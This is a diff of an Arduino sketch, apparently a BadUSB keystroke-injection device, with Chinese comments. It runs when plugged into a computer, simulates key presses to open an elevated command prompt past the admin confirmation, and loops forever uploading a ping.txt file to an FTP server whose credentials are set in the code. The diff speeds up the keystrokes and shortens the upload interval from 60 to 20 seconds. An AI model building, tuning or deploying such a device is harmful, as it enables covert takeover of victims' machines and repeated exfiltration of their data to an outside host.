@@ -8,9 +8,9 @@ char entKey = KEY_RETURN;
 char lefKey = KEY_LEFT_ARROW;
 char shiftKey = KEY_LEFT_SHIFT;
 
-String server = "xxxxx";
-String FTPuser = "xxxxx";
-String FTPpw = "xxxxx";
+String server = "xxxxxxxxxxx";
+String FTPuser = "xxxxxxx";
+String FTPpw = "xxxxxxxxxxx";
 
 //不用loop是因為setup在插上電腦就會被執行
 void setup() {
@@ -120,17 +120,20 @@ void admin_cmd(void) {
   Keyboard.press(winKey);
   Keyboard.releaseAll();
   Keyboard.println("cmd");
-  delay(200);
+  delay(100);
 
   Keyboard.press(ctrlKey);
+  delay(100);
   Keyboard.press(shiftKey);
+  delay(100);
   Keyboard.press(entKey);
+  delay(100);
   Keyboard.releaseAll();
-  delay(300);
+  delay(100);
 
   Keyboard.press(lefKey);
   Keyboard.releaseAll();
-  delay(500);
+  delay(400);
   Keyboard.press(entKey);
   Keyboard.releaseAll();
   delay(500);
@@ -171,9 +174,9 @@ void hide_ping(void) {
   Keyboard.press(entKey);
   Keyboard.releaseAll();
 
-  // 每60秒自動上傳ping.txt,無限迴圈
+  // 每20秒自動上傳ping.txt,無限迴圈
   while (1) {
-    delay(60000);
+    delay(20000);
     opencmd();
     cd_login();
     // 送出ping.txt
